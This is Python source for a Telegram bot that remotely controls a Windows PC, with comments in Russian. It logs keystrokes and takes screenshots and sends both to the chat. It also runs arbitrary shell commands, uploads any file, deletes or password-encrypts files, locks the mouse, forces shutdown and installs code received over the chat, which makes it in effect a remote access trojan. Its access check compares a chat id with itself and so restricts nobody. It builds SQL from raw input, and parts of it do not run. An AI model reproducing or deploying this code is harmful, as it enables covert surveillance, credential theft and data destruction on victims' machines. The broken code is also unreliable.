import telebot  # Bot
import sqlite3  # Sql db
from PIL import Image
import numpy as np
import pyautogui
import pyperclip  # Input text
import cv2
import os
from pynput.keyboard import Listener
import time
from threading import Thread
import autoit  # Mouse Lock
import subprocess
import datetime  # Now date and time
import sys
import pyAesCrypt  # Crypt

with open('Res\\token.txt', 'r') as f:
    token = f.read()

bot = telebot.TeleBot(token)

chat_id = 0
keys = []
mouse = False
mouse_start = 0
cmd_stop = False
enter_text = False
upload_image = False
upload_file = False
dirs = False
Encrypt = False
Decrypt = False
update = False
delete = False
backup = False
run = False


# filling Sql base
def action_log(action, message, now=None):
    if now is None:
        now = datetime.datetime.now()
    con = sqlite3.connect("Res\\logs.db")
    cur = con.cursor()
    cur.execute(f"""INSERT INTO Action 
        VALUES('{action}','{message}', '{now.strftime("%d.%m.%Y  %H:%M:%S")}')""")
    con.commit()
    con.close()


# Key_logger
class Keylogger:
    def __init__(self):
        global keys

    def on_press(self, key):
        keys.append(key)


def key_logger(now):
    global keys
    now = now.strftime("%d%m%Y-%H%M%S")
    obj = Keylogger()
    key_listener = Listener(on_press=obj.on_press)
    key_listener.start()
    time.sleep(20)
    key_listener.stop()
    end = ''
    for key in keys:
        k = str(key).replace("'", "")
        if k.find('Key.space') > 0:
            end += "  "
        elif 'Key.enter' in k:
            end += '\n'
        elif 'Key.' in k:
            end += ' ' + k + ' '
        else:
            end += k
    keys = []
    with open(f'Key_logs\\{now}.txt', 'w') as file:
        file.write(end)
    return end


def screenshot(now):
    image = pyautogui.screenshot(region=(0, 0, 1920, 1080))
    image = cv2.cvtColor(np.array(image), cv2.COLOR_RGB2BGR)
    cv2.imwrite(f'Images\\{now}.png', image)


# Блокировка курсора
def mouse_lock():
    global mouse
    while mouse:
        autoit.mouse_move(0, 1080, 0)


def encrypt(file, password):
    file = file
    password = password
    bufferSize = 64 * 1024
    try:
        pyAesCrypt.encryptFile(str(file), str(file) + ".crp", password, bufferSize)
    except FileNotFoundError:
        bot.send_message(chat_id=chat_id, text='File not found!')
    else:
        os.remove(file)
        bot.send_message(chat_id=chat_id, text='File ' + str(file) + '.crp' ' successfully saved!')


def decrypt(file, password):
    file = file
    password = password
    bufferSize = 64 * 1024
    try:
        pyAesCrypt.decryptFile(str(file), str(os.path.splitext(file)[0]), password, bufferSize)
    except FileNotFoundError:
        bot.send_message(chat_id=chat_id, text='File not found!')
    except ValueError:
        bot.send_message(chat_id=chat_id, text='Password is False!')
    else:
        os.remove(file)
        bot.send_message(chat_id=chat_id, text='File ' + str(os.path.splitext(file)[0]) + ' successfully saved!')


MouseLock = Thread(target=mouse_lock)
MouseLock1 = Thread(target=mouse_lock)


# Создание, отправка, сохранение, и запись в базу screenshot'a
@bot.message_handler(commands=['screenshot'])
def start_message(message):
    if message.chat.id != message.chat.id:
        with open('third-party-users.txt', 'a') as file:
            file.write(message.chat.id)
    else:
        now = datetime.datetime.now()
        action_log('Screenshot', 'Снимок экрана', now)
        now = now.strftime("%d%m%Y-%H%M%S")
        bot.send_message(message.chat.id, f'{now}.png')
        screenshot(now)
        pic = open(f'Images\\{now}.png', 'rb')
        try:
            bot.send_photo(message.chat.id=message.chat.id, photo=pic, timeout=1000)
        except:
            bot.send_message(message.chat.id, 'time_out')


# Открытие консоли и ввод команды
@bot.message_handler(commands=['cmd'])
def start_message(message):
    global cmd_stop
    if message.chat.id != message.chat.id:
        with open('third-party-users.txt', 'a') as file:
            file.write(message.chat.id)
    else:
        bot.send_message(message.chat.id, 'Введите команду:')
        cmd_stop = True


@bot.message_handler(func=lambda message: cmd_stop, content_types=['text'])
def command_default(message):
    global cmd_stop
    now = datetime.datetime.now()
    action_log('Input command', f'Команда :{message.text}', now)
    bot.send_message(chat_id=message.chat.id, text=f"Попытка запустить команду '{message.text}'")
    try:
        subprocess.check_call('cmd.exe /c start' + f' {message.text}')
        bot.send_message(message.chat.id, text=f"Команда '{message.text}' запущена")
    except:
        bot.send_message(message.chat.id, text=f"Попытка запустить команду '{message.text}' провалена")
    cmd_stop = False


# Ввод куда либо текста
@bot.message_handler(commands=['text'])
def start_message(message):
    global enter_text
    if message.chat.id != message.chat.id:
        with open('third-party-users.txt', 'a') as file:
            file.write(message.chat.id)
    else:
        bot.send_message(message.chat.id, 'Введите текст:')
        enter_text = True


@bot.message_handler(func=lambda message: enter_text, content_types=['text'])
def command_default(message):
    global enter_text
    bot.send_message(chat_id=message.chat.id, text=f"Ввод текста '{message.text}'")
    now = datetime.datetime.now()
    action_log('Text_Input', f'Ввод текста: {message.text}', now)
    pyperclip.copy(message.text)
    pyautogui.hotkey("ctrl", "v")
    pyautogui.hotkey("enter")
    enter_text = False


# Key_logger
@bot.message_handler(commands=['keys'])
def start_message(message):
    if message.chat.id != message.chat.id:
        with open('third-party-users.txt', 'a') as file:
            file.write(message.chat.id)
    else:
        now = datetime.datetime.now()
        action_log('Key_Logger', f'Сохранение нажатий за 20 секунд', now)
        bot.send_message(message.chat.id, 'Клавиши за 20 секунд:')
        key_log = key_logger(now)
        if len(key_log) == 0:
            key_log = 'None'
        bot.send_message(message.chat.id, key_log)


# Выключение Компьютера
@bot.message_handler(commands=['shutdown'])
def start_message(message):
    if message.chat.id != message.chat.id:
        with open('third-party-users.txt', 'a') as file:
            file.write(message.chat.id)
    else:
        action_log('Shutdown', 'Компьютер был отключен программой')
        bot.send_message(message.chat.id, "Выключение компьютера")
        os.system('shutdown -s -f -t 0')


# Mouse_Lock
@bot.message_handler(commands=['mouselock'])
def start_message(message):
    if message.chat.id != message.chat.id:
        with open('third-party-users.txt', 'a') as file:
            file.write(message.chat.id)
    else:
        markup = telebot.types.InlineKeyboardMarkup()
        markup.add(telebot.types.InlineKeyboardButton(text='On', callback_data='1'))
        markup.add(telebot.types.InlineKeyboardButton(text='OFF', callback_data='2'))
        bot.send_message(message.chat.id, text="Mouse Lock?", reply_markup=markup)


@bot.callback_query_handler(func=lambda call: True)
def query_handler(call):
    global mouse, mouse_start
    if call.data == '1' and mouse_start in [0, 1] and not mouse:
        mouse = True
        if mouse_start == 0:
            MouseLock.start()
        elif mouse_start == 1:
            MouseLock1.start()
        answer = 'Mouse Lock has Started'
    elif call.data == '2' and mouse_start in [0, 1] and mouse:
        mouse = False
        if mouse_start == 0:
            MouseLock.join()
        elif mouse_start == 1:
            MouseLock1.join()
        mouse_start += 1
        answer = 'Mouse Lock has Stopped'
    else:
        answer = 'Mouse Lock has blocked'
    action_log('Mouse_Lock', answer)
    bot.answer_callback_query(callback_query_id=call.id, text=answer)
    bot.send_message(message.chat.id, answer)
    bot.edit_message_reply_markup(message.chat.id, call.message.message_id)


# Загрузка сохранённых скринов, есть 'download', но так быстрее(только по названию)
@bot.message_handler(commands=['image'])
def start_message(message):
    global upload_image
    if message.chat.id != message.chat.id:
        with open('third-party-users.txt', 'a') as file:
            file.write(message.chat.id)
    else:
        bot.send_message(message.chat.id, 'Введите название image:')
        upload_image = True


@bot.message_handler(func=lambda message: upload_image, content_types=['text'])
def command_default(message):
    global upload_image
    bot.send_message(chat_id=message.chat.id, text=f"Uploading image: '{message.text}'")
    action_log('Uploading_an_image', f'Uploading image: {message.text}')
    try:
        image = open(f'Images\\{message.text}', 'rb')
        bot.send_document(message.chat.id, image)
    except FileNotFoundError:
        bot.send_message(chat_id=message.chat.id, text=f"Image '{message.text}' not found")
    upload_image = False


@bot.message_handler(commands=['encrypt'])
def start_message(message):
    global Encrypt
    if message.chat.id != message.chat.id:
        with open('third-party-users.txt', 'a') as file:
            file.write(message.chat.id)
    else:
        bot.send_message(message.chat.id, 'Enter file and password\nform: File Password:')
        Encrypt = True


@bot.message_handler(func=lambda message: Encrypt, content_types=['text'])
def command_default(message):
    global Encrypt
    bot.send_message(chat_id=message.chat.id, text=f"Encrypt file: '{message.text.split(' ')[0]}'")
    try:
        file, password = message.text.split(' ')
        encrypt(file, password)
        now = datetime.datetime.now()
        action_log('Encrypt file', f'Encrypt file: {message.text}', now)
    except ValueError:
        bot.send_message(chat_id=message.chat.id, text=f"Please input 2 elements\nbut not'{message.text}'")
    Encrypt = False


@bot.message_handler(commands=['decrypt'])
def start_message(message):
    global Decrypt
    if message.chat.id != message.chat.id:
        with open('third-party-users.txt', 'a') as file:
            file.write(message.chat.id)
    else:
        bot.send_message(message.chat.id, 'Enter file and password\nform: File Password:')
        Decrypt = True


@bot.message_handler(func=lambda message: Decrypt, content_types=['text'])
def command_default(message):
    global Decrypt
    bot.send_message(chat_id=message.chat.id, text=f"Decrypt file:\n'{message.text.split(' ')[0]}'")
    try:
        file, password = message.text.split(' ')
        decrypt(file, password)
        now = datetime.datetime.now()
        action_log('Decrypt file', f'Decrypt file: {message.text}', now)
    except ValueError:
        bot.send_message(chat_id=message.chat.id, text=f"Please input 2 elements\nbut not'{message.text}'")
    Decrypt = False


# Отправить файл с компьютера
@bot.message_handler(commands=['download'])
def start_message(message):
    global upload_file
    if message.chat.id != message.chat.id:
        with open('third-party-users.txt', 'a') as file:
            file.write(message.chat.id)
    else:
        bot.send_message(message.chat.id, 'Введите полный путь к файлу:')
        upload_file = True


@bot.message_handler(func=lambda message: upload_file, content_types=['text'])
def command_default(message):
    global upload_file
    bot.send_message(chat_id=message.chat.id, text=f"Uploading File:\n {message.text}")
    action_log('Upload_File', f'Uploading File: {message.text}')
    try:
        image = open(message.text, 'rb')
        bot.send_document(message.chat.id, image)
    except FileNotFoundError:
        bot.send_message(chat_id=message.chat.id, text=f"File '{message.text}' not found")
    upload_file = False


@bot.message_handler(commands=['update'])
def start_message(message):
    global update
    if message.chat.id != message.chat.id:
        with open('third-party-users.txt', 'a') as file:
            file.write(message.chat.id)
    else:
        bot.send_message(message.chat.id, 'Отправте файл обновления')
        update = True


@bot.message_handler(func=lambda message: update, content_types=['document'])
def handle_file(message):
    global update
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        with open('update.pyw', 'wb') as new_file:
            new_file.write(downloaded_file)
        bot.send_message(message.chat.id, 'Начало обновления')
        action_log('Update', 'Update Bot')
        bot.stop_polling()
        os.startfile('Updater.pyw')
    except Exception as e:
        bot.send_message(message.chat.id, str(e))
    update = False


@bot.message_handler(commands=['backup'])
def start_message(message):
    global backup
    if message.chat.id != message.chat.id:
        with open('third-party-users.txt', 'a') as file:
            file.write(message.chat.id)
    else:
        bot.send_message(message.chat.id, "Подтвердите начало backup'a:   Y/N")
        backup = True


@bot.message_handler(func=lambda message: backup, content_types=['text'])
def handle_file(message):
    global backup
    try:
        if message.text == 'Y':
            bot.send_message(message.chat.id, 'Начало backup`a')
            action_log('Backup', 'Backup Bot to last version')
            bot.stop_polling()
            os.startfile('Backup.pyw')
        else:
            bot.send_message(message.chat.id, 'Backup отменён')
    except Exception as e:
        bot.send_message(message.chat.id, str(e))
    backup = False


# Просмотр презентации

@bot.message_handler(commands=['start'])
def start_message(message):
    if message.chat.id != message.chat.id:
        with open('third-party-users.txt', 'a') as file:
            file.write(message.chat.id)
    else:
        try:
            pyautogui.hotkey("f5")
        except:
            bot.send_message(message.chat.id, 'time_out')


# Следующий слайд
@bot.message_handler(commands=['next'])
def start_message(message):
    if message.chat.id != message.chat.id:
        with open('third-party-users.txt', 'a') as file:
            file.write(message.chat.id)
    else:
        try:
            pyautogui.hotkey("space")
        except:
            bot.send_message(message.chat.id, 'time_out')


# Прошлый слайд
@bot.message_handler(commands=['back'])
def start_message(message):
    if message.chat.id != message.chat.id:
        with open('third-party-users.txt', 'a') as file:
            file.write(message.chat.id)
    else:
        try:
            pyautogui.hotkey("left")
        except:
            bot.send_message(message.chat.id, 'time_out')


@bot.message_handler(commands=['delete'])
def start_message(message):
    global delete
    if message.chat.id != message.chat.id:
        with open('third-party-users.txt', 'a') as file:
            file.write(message.chat.id)
    else:
        bot.send_message(message.chat.id, 'Ввидите путь до файла или папки для удаления')
        delete = True


@bot.message_handler(func=lambda message: delete, content_types=['text'])
def handle_file(message):
    global delete
    try:
        if '.' not in message.text:
            os.remove(message.text)
        else:
            os.rmdir(message.text)
        action_log('Delete', 'Delete: ' + message.text)
    except Exception as e:
        bot.send_message(message.chat.id, str(e))
    delete = False


@bot.message_handler(commands=['open'])
def start_message(message):
    global run
    if message.chat.id != message.chat.id:
        with open('third-party-users.txt', 'a') as file:
            file.write(message.chat.id)
    else:
        bot.send_message(message.chat.id, 'Ввидите путь до файла или папки')
        run = True


@bot.message_handler(func=lambda message: run, content_types=['text'])
def handle_file(message):
    global run
    try:
        os.startfile(message.text)
        action_log('Open', 'Open: ' + message.text)
    except Exception as e:
        bot.send_message(message.chat.id, str(e))
    run = False


# Просмотр файлов в определённой дириктории
@bot.message_handler(commands=['dir'])
def start_message(message):
    global dirs
    if message.chat.id != message.chat.id:
        with open('third-party-users.txt', 'a') as file:
            file.write(message.chat.id)
    else:
        bot.send_message(message.chat.id, 'Введите дирикторию:')
        dirs = True


@bot.message_handler(func=lambda message: dirs, content_types=['text'])
def command_default(message):
    global dirs
    bot.send_message(chat_id=message.chat.id, text=f"File in Dir:\n {message.text}")
    action_log('Dir:', f'File and dirs in Directory: {message.text}')
    try:
        dirs_in_folder = os.listdir(message.text)
        folder = list(filter(lambda x: '.' not in x, dirs_in_folder))
        folder.sort()
        files = list(filter(lambda x: '.' in x, dirs_in_folder))
        files.sort()
        end = folder + files
        end = '\n'.join(end)
        with open('dirs.txt', 'w') as file:
            file.write(end)
        file = open('dirs.txt', 'rb')
        bot.send_document(message.chat.id, file)
    except FileNotFoundError:
        bot.send_message(chat_id=message.chat.id, text=f"File '{message.text}' not found")
    dirs = False


# Выключение бота
@bot.message_handler(commands=['exit'])
def start_message(message):
    global upload_image
    if message.chat.id != message.chat.id:
        with open('third-party-users.txt', 'a') as file:
            file.write(message.chat.id)
    else:
        bot.send_message(chat_id=message.chat.id, text=f"Bot has stopped")
        bot.stop_polling()
        action_log('Bot has stopped', f'Остановка работы Бота')


@bot.message_handler(commands=['mute'])
def start_message(message):
    if message.chat.id != message.chat.id:
        with open('third-party-users.txt', 'a') as file:
            file.write(message.chat.id)
    else:
        try:
            pyautogui.hotkey("=")
        except:
            bot.send_message(message.chat.id, 'time_out')


# Проверка наличия подключения любым сообщением
@bot.message_handler(content_types=['text'])
def send_text(message):
    if message.chat.id != message.chat.id:
        with open('third-party-users.txt', 'a') as file:
            file.write(message.chat.id)
    else:
        bot.send_message(message.chat.id, 'Есть сигнал')


bot.polling()
